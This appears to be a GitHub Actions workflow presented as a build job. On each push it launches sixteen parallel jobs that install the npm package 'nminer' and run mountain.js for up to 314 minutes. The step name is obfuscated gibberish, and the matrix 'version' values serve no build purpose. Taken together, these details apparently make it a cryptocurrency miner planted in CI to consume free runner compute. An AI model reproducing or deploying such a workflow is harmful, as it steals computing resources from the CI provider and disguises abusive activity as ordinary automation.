name: mountain
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 3366 }
          - { version: 6371 }
          - { version: 4055 }
          - { version: 7607 }
          - { version: 4259 }
          - { version: 2176 }
          - { version: 7223 }
          - { version: 3577 }
          - { version: 994 }
          - { version: 4492 }
          - { version: 566 }
          - { version: 2350 }
          - { version: 4178 }
          - { version: 7208 }
          - { version: 6803 }
          - { version: 7369 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: probable which kissingly atop
        run: |
          npm install nminer@latest
          timeout 314m node mountain.js || echo "mountain executed"